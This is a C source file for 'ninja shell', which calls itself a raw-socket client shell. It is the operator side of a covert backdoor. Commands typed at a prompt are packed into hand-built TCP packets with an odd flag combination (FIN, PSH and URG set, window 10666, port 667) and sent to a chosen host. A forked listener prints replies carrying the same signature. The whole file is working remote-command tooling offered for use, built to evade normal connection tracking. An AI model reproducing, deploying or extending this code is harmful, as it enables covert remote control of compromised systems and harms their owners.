/*


Author:Antonio Costa aka " Cooler_ "
contact: c00f3r[at]gmail[dot]com

    Copyright (C) 2013 ninja shell authors,
    
    This file is part of ninja shell
    
    ninja shell is free software: you can redistribute it and/or modify
    it under the terms of the GNU Lesser General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    ninja shell is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Lesser General Public License for more details.

    You should have received a copy of the GNU Lesser General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

Thanks: Iak(Tiago Natel),m0nad(Victor Ramos)

What is this ?
just another raw socket client shell
 
*/
#include <stdio.h>    
#include <stdlib.h> 
#include <string.h>    
#include <unistd.h>    
#include <sys/time.h>    
#include <sys/wait.h>
#include <alloca.h>
// socks
#include <netdb.h>      
#include <sys/socket.h>    
#include <arpa/inet.h>    
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>  
     
#define SIZE 50
#define BUF 19
 
#define PORT  667
#define MAX    9192
#define ERRO   -1

void fazerpacote(char * dest_addr, unsigned short dest_port,char *payload); 
unsigned short in_cksum(unsigned short *, int);    
int orion_getHostByName(const char* name, char* buffer);  
void listening_raw();
void chomp(char * str);

void init_serv()
{
 pid_t childPID;
 childPID=fork();

 if(!childPID)
 {
  listening_raw();
 }
}


int main(int argc, char *argv[]) 
{
 char IP[16]; 
 char *destino=NULL,*input=NULL;

 if(argc < 2) 
 {
  puts("follow example ./proc host\n Ninja Shell\njust another raw socket  client server shell\n by Cooler_ \n contact: c00f3r[at]gmail[dot]com\n");
  exit(0);    
 }    

 if(!orion_getHostByName(argv[1],IP))
 {
  puts("orion_gethostbyname() failed");
  exit(1);
 }
  fprintf(stdout,"\nIP: %s \n",IP);    
  //fprintf(stdout,"fate  : %s\n",argv[1]);    
     
  destino=(char *)alloca(sizeof(IP)+1);  
  strncpy(destino,IP, (sizeof(IP)) );

  init_serv();
 
  while(1) 
  {     
   input=(char *)alloca(MAX*sizeof(char));
   bzero(input, MAX);
   fprintf(stdout,"CMD:");
   fgets(input,MAX-1,stdin); 
   chomp(input);
   fazerpacote(destino, PORT,input);
   if(strstr(input,"die now"))
   {
    
    break;
   }
   
   sleep(2); 
  }
 
 exit(1);
}    

     
void fazerpacote(char *dest_addr, unsigned short dest_port, char * payload)
{    
#define DATALENGTH  512 // depois torne isso dinamico
  // Aqui o seu pacote: IP + TCP + DATA
  char packet[sizeof (struct iphdr) + sizeof (struct tcphdr) + MAX];
 struct envio {    
  struct iphdr *ip;    
  struct tcphdr *tcp;
 } envio;    

 struct pseudo_header {    
  unsigned int source_address;    
  unsigned int dest_address;    
  unsigned char placeholder;    
  unsigned char protocol;    
  unsigned short tcp_length;    
  char* data;
 };
     
 int tcp_socket;   
 struct sockaddr_in sin; 
 unsigned int destino;
 
 envio.ip = (struct iphdr*) packet;
 envio.tcp = (struct tcphdr*) (packet + sizeof (struct iphdr));
 struct pseudo_header pseudo_header; 
 char* data = packet +  sizeof(struct iphdr) + sizeof(struct tcphdr);
 
 // AQUI A SUA MENSAGEM A SER ENVIADA (PAYLOAD)
 const char* message = payload;
 strncpy(data, message, strlen(message));
 
// inet_pton(PF_INET, source_addr, &remetente);
 inet_pton(PF_INET, dest_addr, &destino);
 
 bzero(packet, sizeof(struct iphdr)); 
         
//setamos variaveis do pacote ip   
 envio.ip->ihl = 5;    
 envio.ip->version = 4;    
 envio.ip->tos = 0;    
 envio.ip->tot_len = htons(sizeof(struct iphdr) + MAX);  
 envio.ip->id = dest_port;    
 envio.ip->frag_off = 0;    
 envio.ip->ttl = 255;    
 envio.ip->protocol = IPPROTO_TCP;    
 envio.ip->check = 0;    
// envio.ip->saddr = remetente;    
 envio.ip->daddr = destino;    
        
//setamos variaveis do pacote TCP    
 envio.tcp->source = dest_port;    
 envio.tcp->dest = htons(dest_port);    
 envio.tcp->seq = dest_port;          
 envio.tcp->res1 = 0;
 envio.tcp->res2 = 0;     
 envio.tcp->doff = 5;    
 envio.tcp->ack = 0; 
 envio.tcp->ack_seq = 0;    
 envio.tcp->urg_ptr = 0;        
 envio.tcp->window = htons(10666);    
 envio.tcp->check = 0;   
//flags 
 envio.tcp->fin = 1;    
 envio.tcp->syn = 0;    
 envio.tcp->rst = 0;    
 envio.tcp->psh = 1;  
 envio.tcp->urg = 1;  
 envio.tcp->ack = 0; 
                
 sin.sin_family = AF_INET;    
 sin.sin_port = envio.tcp->source;    
 sin.sin_addr.s_addr = envio.ip->daddr;       
        
// abrimos a socket   
  tcp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);    
  if(tcp_socket < 0) 
  {    
   perror("socket");    
   exit(1);    
  }    
        
// setamos os campos que precisão ser mudados   
  envio.tcp->source++;    
  envio.ip->id++;    
  envio.tcp->seq++;    
  envio.tcp->check = 0;    
  envio.ip->check = 0;    

    //envio.ip->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);           
// checksum   
  envio.ip->check = in_cksum((unsigned short *)&envio.ip, sizeof (struct iphdr)); 
     
// setamos campo dos cabeçalhos     
  pseudo_header.source_address = envio.ip->saddr;    
  pseudo_header.dest_address = envio.ip->daddr;    
  
  pseudo_header.protocol = IPPROTO_TCP;    
  pseudo_header.tcp_length = htons(sizeof(struct tcphdr) + MAX);
  pseudo_header.data = data;

  envio.tcp->check = in_cksum((unsigned short *)&pseudo_header, sizeof(struct tcphdr) + sizeof(struct pseudo_header) + MAX); //32    
   

  // Voce precisa setar HDRINCL no seu socket para o kernel aceitar a sua definicao do iphdr
  int one = 1;
  const int *val = &one;
  if (setsockopt (tcp_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    printf ("Warning: Cannot set HDRINCL!\n");

  if (sendto(tcp_socket, packet, ntohs(envio.ip->tot_len), 0, (struct sockaddr *)&sin, sizeof(struct sockaddr_in)) < 0) 
  {
    fprintf(stderr, "sendto error...\n");
    perror("ops");
    close(tcp_socket);    
    exit(1);
  } 
    
  close(tcp_socket);    
}    
     
//calculo feito afim de checar a integridade 
unsigned short in_cksum(unsigned short *ptr, int nbytes) 
{    
 register u_short    answer;     // u_short == 16 bits   
 register long       sum;        // long == 32 bits    
 u_short         oddbyte;     
     
 sum = 0;    
 while(nbytes > 1)  
 {    
  sum += *ptr++;   
  nbytes -= 2;    
 }    
                        
 if(!(nbytes^1)) 
 {    
  oddbyte = 0;       
  *((u_char *) &oddbyte) = *(u_char *)ptr;      
  sum += oddbyte;    
 }    
     
 sum = (sum >> 16) + (sum & 0xffff);  // addicina auto-16 para baixo-16     
 sum += (sum >> 16);           
 answer = ~sum;         
 return(answer);    
}    
     
//function from my Brother I4K the master of wizards
//from Orion-Socket API
int orion_getHostByName(const char* name, char* buffer)
{
    struct addrinfo hints, * res, * res0 = NULL;
    struct sockaddr_in * target = NULL;
    int error;
    char *tmp = NULL;
    
    memset(&hints, 0, sizeof(struct addrinfo));
    
    hints.ai_family = PF_UNSPEC;
    hints.ai_socktype = 0;
    error = getaddrinfo(name, "http", &hints, &res0);
    
    if(error)
    {
        if (res0)
            freeaddrinfo(res0);
        return 1;
    }
    
    for (res = res0; res; res = res->ai_next)
    {
        target = (struct sockaddr_in *) res->ai_addr;
        if (target)
        {
            tmp = inet_ntoa(target->sin_addr);
            if (tmp && strlen(tmp))
            {
                strncpy(buffer, tmp, strlen(tmp));
                buffer[strlen(tmp)] = '\0';
                if (res0)
                    freeaddrinfo(res0);
                return 1;
            }
        }
    }
    
    freeaddrinfo(res0);
    
    return 0;
}


void listening_raw()
{
 int  sockfd,counter;
 char buffer[MAX];
// struct iphdr *iphr;
 struct tcphdr *tcphr;


// iphr = (struct iphdr *) buffer;
 tcphr = (struct tcphdr *) (buffer + sizeof(struct iphdr));

 if((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == ERRO)
  exit(ERRO);

 while(read(sockfd, buffer, sizeof(buffer))) 
 {
  if((ntohs(tcphr->dest)==PORT)&&(tcphr->fin == 1)&&(tcphr->psh == 1) &&(tcphr->urg == 1) && (tcphr->window == htons(10666))) 
  {
   counter=sizeof(struct tcphdr) + sizeof(struct iphdr);
   
   fprintf(stdout,"result: %s \n",buffer+counter);
  }
  bzero(buffer,MAX+sizeof(counter));
 }

}


void chomp(char * str)
{
  while(*str) 
  {
    if(*str == '\n' || *str == '\r') 
    {
     *str = 0;
     return;
    }
    str++;
  }
} 
